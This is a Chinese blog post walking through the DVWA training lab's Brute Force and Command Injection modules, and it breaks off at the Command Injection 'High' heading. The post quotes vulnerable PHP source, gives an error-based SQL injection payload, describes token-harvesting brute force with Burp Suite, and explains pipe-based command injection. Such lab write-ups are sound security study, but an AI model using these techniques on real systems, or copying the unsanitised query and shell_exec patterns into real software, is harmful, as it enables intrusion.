<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="重温DVWA, hybcx&#39;s blog">
    <meta name="description" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>重温DVWA | hybcx&#39;s blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">hybcx&#39;s blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">hybcx&#39;s blog</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">重温DVWA</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/web%E6%B8%97%E9%80%8F/">
                                <span class="chip bg-color">web渗透</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/Web%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/" class="post-category">
                                Web渗透靶场
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2024-01-10
                </div>
                

                

                

                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1>0x01 Brute Force</h1>
<h2 id="Low">Low</h2>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110161718337.png" alt="image-20240110161718337"></p>
<p>这一部分处理用户输入的username与password(md5加密)</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// Check the database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">"SELECT * FROM `users` WHERE user = '<span class="hljs-subst">$user</span>' AND password = '<span class="hljs-subst">$pass</span>';"</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span><br>        ( <span class="hljs-string">'&lt;pre&gt;'</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );<br></code></pre></td></tr></tbody></table></figure>
<p>构造查询语句（处理用户输入的用户名和密码）接着与数据库连接，进入数据库进行匹配查询</p>
<p><code>mysqli_query</code>:  这是 MySQLi 扩展提供的函数，用于执行 SQL 查询。第一个参数是连接标识符，通常使用全局变量 <code>$GLOBALS["___mysqli_ston"]</code>，第二个参数包含sql查询的字符串</p>
<p><code>or die...</code>如果前面的语句执行失败，就会执行die后面的代码：后面的代码用于获取并输入MySQL错误信息。</p>
<p>首先判断<code>$GLOBALS["___mysqli_ston"]</code>是否为对象，如果是，这说明是存在连接错误，并用<code>mysqli_error</code>函数获取具体的错误信息；如果不是对象，则用<code>mysqli_connect_error</code>获取错误信息</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>( <span class="hljs-variable">$result</span> &amp;&amp; <span class="hljs-title function_ invoke__">mysqli_num_rows</span>( <span class="hljs-variable">$result</span> ) == <span class="hljs-number">1</span> ) {<br>        <span class="hljs-comment">// Get users details</span><br>        <span class="hljs-variable">$row</span>    = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>( <span class="hljs-variable">$result</span> );<br>        <span class="hljs-variable">$avatar</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">"avatar"</span>];<br><br>        <span class="hljs-comment">// Login successful</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;Welcome to the password protected area <span class="hljs-subst">{$user}</span>&lt;/p&gt;"</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;img src=\"<span class="hljs-subst">{$avatar}</span>\" /&gt;"</span>;<br>    }<br>    <span class="hljs-keyword">else</span> {<br>        <span class="hljs-comment">// Login failed</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>;<br>    }<br></code></pre></td></tr></tbody></table></figure>
<p><code>mysqli_num_rows</code>用于获取结果中的行数</p>
<p>如果查询到了返回结果，并且返回的结果行数为1，这说明成功找到对应的用户数据</p>
<p><code>mysql_fetch_assoc </code>从结果中取得一行作为关联数组，并获取该关联数组键值为avatar对应的value，随后就是一些信息的展示</p>
<p><img src="C:/Users/%E4%BB%98%E6%80%9D%E9%92%A7/AppData/Roaming/Typora/typora-user-images/image-20240110163523391.png" alt="image-20240110163523391"></p>
<p>调用mysqli_close关闭MySQL连接，并将关闭结果的布尔值赋值为对应的变量，如果成功关闭，返回false；否则返回变量本身的value</p>
<p>综上分析，该网站对于用户的登录次数并没有做出任何限制，可以尽情的爆破</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110165344749.png" alt="image-20240110165344749"></p>
<p>值得注意的是，这里的代码也没有对用户输入的数据进行过滤，这表明我们可以通过sql注入进去。但这里不能使用联合注入，因为并不会回回显相关查询信息。</p>
<p>但幸运的是我们可以进行万能密码和报错注入（因为mysql_error的存在）</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110174835187.png" alt="image-20240110174835187"></p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">username=admin<span class="hljs-string">'+and+updatexml(1,concat(0x7e,(select version())),1)--+&amp;password=bug&amp;Login=Login#</span><br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110175628824.png" alt="image-20240110175628824"></p>
<p>当然盲注也是可以的，但手工效率低</p>
<h2 id="Medium">Medium</h2>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110165457173.png" alt="image-20240110165457173"></p>
<p>中级水平如上所示。在开始的地方，分别对用户输入的username与password数据由<code>mysqli_real_escape_string</code>进行处理，对用户输入的特殊字符进行转义，特殊字符如下</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110173234354.png" alt="image-20240110173234354"></p>
<p>剩下的基本一致，亮点在于，这里如果用户输入的数据与数据库数据不匹配，则会sleep 2，休眠2秒。但这对我们的爆力破解是无用的，只不过延长了我们爆破的时间</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110173332294.png" alt="image-20240110173332294"></p>
<h2 id="High">High</h2>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">'user_token'</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">'session_token'</span> ], <span class="hljs-string">'index.php'</span> );<br></code></pre></td></tr></tbody></table></figure>
<p>首先调用了个自定义函数checkToken，并向其中传入用户的令牌以及session会话</p>
<p>并且在对用户的用户名和密码输入方面添加了<code>$user = stripslashes( $user );</code>进行处理，<code>stripslashes</code>在于删除用户输入的数据中可能含有的反引号```</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110174218276.png" alt="image-20240110174218276"></p>
<p>这里依旧同之前的难度基本一致，不过睡眠时间成了随机了</p>
<p><img src="C:/Users/%E4%BB%98%E6%80%9D%E9%92%A7/AppData/Roaming/Typora/typora-user-images/image-20240110174313319.png" alt="image-20240110174313319"></p>
<p>最后这里说该函数是用来生成CSRF令牌的。综上所述，这里防止了CSRF的攻击，但我们仍可以进行暴力破解，不过麻烦的事需要在每次破解的时候，抓取页面的令牌token</p>
<p>这里我们关注一下token的处理，Token 的值来源于 index.php，访问 index.php 查看源码信息，找到如下 token 的位置：</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span> DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">'dvwa/includes/dvwaPage.inc.php'</span>;<br></code></pre></td></tr></tbody></table></figure>
<p>我们追踪位置，发现如下代码：</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110180228502.png" alt="image-20240110180228502"></p>
<p>这里的checktoken用于检查用户令牌。如果用户令牌与session会话不相等，则报错，并且还会重定向到index.php；而后续的generate函数用当前的时间戳md5值来生成session，这里复习一波如何用burpsuite来爆破</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110180711050.png" alt="image-20240110180711050"></p>
<p>抓包看到这里多了两个参数，但只需要关注token即可。值得注意的是这里含有302重定向，因此我们在bp设置的时候需要跟随以便获取index.php页面的某些数据</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110191340667.png" alt="image-20240110191340667"></p>
<p>这里看到文章说线程最好设置为1，多线程基本不行</p>
<p><img src="C:/Users/%E4%BB%98%E6%80%9D%E9%92%A7/AppData/Roaming/Typora/typora-user-images/image-20240110191514438.png" alt="image-20240110191514438"></p>
<p>这里我们设置爆破点为password与token，其中payload 1 为正常的密码字典即可。payload2设置为递归提取</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110191609562.png" alt="image-20240110191609562"></p>
<p>递归<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=grep&amp;spm=1001.2101.3001.7020">grep</a> （Recursive grep） 主要用于从服务器端提取有效数据，需先从服务器响应中提取数据在替换payload位置进行正则配置</p>
<p>注意：使用递归搜索时线程必须是1</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110191854218.png" alt="image-20240110191854218"></p>
<p>根据上述图片的步骤设置好，对于token的查找，我们在图片右侧选择获取响应，接着在下面的响应中找到token所在位置，鼠标选中即可，接着你会看到上方已经自动生成好了正则表达式</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110192046461.png" alt="image-20240110192046461"></p>
<p>如上图成功爆破</p>
<h2 id="Impossible">Impossible</h2>
<p>前面的某些部分与High一般，我们重点看新增的</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110192548395.png" alt="image-20240110192548395"></p>
<p><code>$data = $db-&gt;prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );</code>: 创建一个 PDO 准备语句（prepared statement），该语句用于执行 SQL 查询。查询的目标是从名为 “users” 的表中选择 “failed_login” 和 “last_login” 列的值，条件是 “user” 列等于提供的参数 <code>:user</code>。<code>LIMIT 1</code> 确保只返回一行数据。</p>
<p><code>$data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );</code>: 绑定参数 <code>:user</code>，这是一个占位符，与预备语句中的 <code>(:user)</code> 对应。将 <code>$user</code> 变量绑定到这个参数，并指定参数类型为字符串（<code>PDO::PARAM_STR</code>）。</p>
<p>之后便是执行该PDO语句，并获取返回结果中的每一行数据</p>
<p>之后如果返回结果中如果只有一行数据且登陆失败的值大于指定的登录失败的值（3）就进入if循环，根据注释，这代表着用户已经被锁定</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-comment">// 用户被锁定。注意，使用此方法可能导致用户枚举！</span><br><span class="hljs-comment">// echo "&lt;pre&gt;&lt;br /&gt;由于登录错误次数过多，此帐户已被锁定。&lt;/pre&gt;";</span><br><span class="hljs-comment">// 计算用户何时可以再次登录</span><br></code></pre></td></tr></tbody></table></figure>
<p>这里获取最后一次登录的时间，接着+15*60，也就是禁用15分钟，接着timenow获取当前时间，如果当前时间小于规定的禁用时间，则账户依旧处于被锁定的状态</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110193530543.png" alt="image-20240110193530543"></p>
<p>这里同上述一般，也是进入数据库查询用户输入的内容是否与其匹配</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110193703159.png" alt="image-20240110193703159"></p>
<p>这里说如果用户的内容在数据库中可以找到，并且用户未处于锁定状态，说明用户成功登录。进入if后，获取了到目前为止登陆失败的次数与上一次登录的时间。</p>
<p>然后判断登录次数是否大于网站限制的登录次数，如果超过了，则会提醒用户在此次登录之前，你的账号存在被暴力破解的危险。</p>
<p>然后重置登陆失败的次数为0（因为成功登陆了）</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110193957147.png" alt="image-20240110193957147"></p>
<p>这里是else语句，如果用户未能成功登录，则会将当前用户对应的登陆失败的次数+1。其实这里的代码逻辑应该是先看下部分在看上部分。</p>
<p>那由于这里对爆破次数做了限制：3次。这几乎断绝了我们破解成功的几率。</p>
<h1>0x02 Command Injection</h1>
<h2 id="Low-2">Low</h2>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'Submit'</span> ]  ) ) {<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">'ip'</span> ];<br><br>    <span class="hljs-comment">// Determine OS and execute the ping command.</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">stristr</span>( <span class="hljs-title function_ invoke__">php_uname</span>( <span class="hljs-string">'s'</span> ), <span class="hljs-string">'Windows NT'</span> ) ) {<br>        <span class="hljs-comment">// Windows</span><br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">'ping  '</span> . <span class="hljs-variable">$target</span> );<br>    }<br>    <span class="hljs-keyword">else</span> {<br>        <span class="hljs-comment">// *nix</span><br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">'ping  -c 4 '</span> . <span class="hljs-variable">$target</span> );<br>    }<br><br>    <span class="hljs-comment">// Feedback for the end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;<span class="hljs-subst">{$cmd}</span>&lt;/pre&gt;"</span>;<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p><code>php_uname</code>：这里配合参数s，最终会返回运行次PHP环境的操作系统信息，看是否为Windows系统，根据系统的类别使用适配的ping用法。</p>
<p>这里显而易见没有对用户输入的ip参数做出有效的过滤，这意味着我们可以配合管道符进行命令执行。</p>
<p>由于这里我是Windows下的，我们先简单了解一下Windows下的管道符相关用法：</p>
<blockquote>
<ul>
<li>“|”前面需要正确，然后显示后面语句的执行结果</li>
<li>“||”如果前面执行的语句执行出错，则执行后面的语句，前面的语句只能为假</li>
<li>“&amp;”如果前面的语句为假则直接执行后面的语句，前面的语句为真则依次执行</li>
<li>“&amp;&amp;”如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真</li>
</ul>
</blockquote>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111200110274.png" alt="image-20240111200110274"></p>
<p>这里我们可以配合|管道符进行命令执行，如上图所示，我们dir成功看到当前目录信息</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111200208094.png" alt="image-20240111200208094"></p>
<p>当然也可以进行文件读取</p>
<h2 id="Medium-2">Medium</h2>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'Submit'</span> ]  ) ) {<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">'ip'</span> ];<br><br>    <span class="hljs-comment">// Set blacklist</span><br>    <span class="hljs-variable">$substitutions</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">'&amp;&amp;'</span> =&gt; <span class="hljs-string">''</span>,<br>        <span class="hljs-string">';'</span>  =&gt; <span class="hljs-string">''</span>,<br>    );<br><br>    <span class="hljs-comment">// Remove any of the characters in the array (blacklist).</span><br>    <span class="hljs-variable">$target</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-title function_ invoke__">array_keys</span>( <span class="hljs-variable">$substitutions</span> ), <span class="hljs-variable">$substitutions</span>, <span class="hljs-variable">$target</span> );<br><br>    <span class="hljs-comment">// Determine OS and execute the ping command.</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">stristr</span>( <span class="hljs-title function_ invoke__">php_uname</span>( <span class="hljs-string">'s'</span> ), <span class="hljs-string">'Windows NT'</span> ) ) {<br>        <span class="hljs-comment">// Windows</span><br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">'ping  '</span> . <span class="hljs-variable">$target</span> );<br>    }<br>    <span class="hljs-keyword">else</span> {<br>        <span class="hljs-comment">// *nix</span><br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">'ping  -c 4 '</span> . <span class="hljs-variable">$target</span> );<br>    }<br><br>    <span class="hljs-comment">// Feedback for the end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;<span class="hljs-subst">{$cmd}</span>&lt;/pre&gt;"</span>;<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>这里上一个level最大的不同就在于，设置了黑名单并且过滤了&amp;&amp;与;分号，不过这并不影响我们，因为这里过滤并不全，我们依旧可以向上一关一样进行文件读取等命令执行</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111200443528.png" alt="image-20240111200443528"></p>
<h2 id="High-2">High</h2>
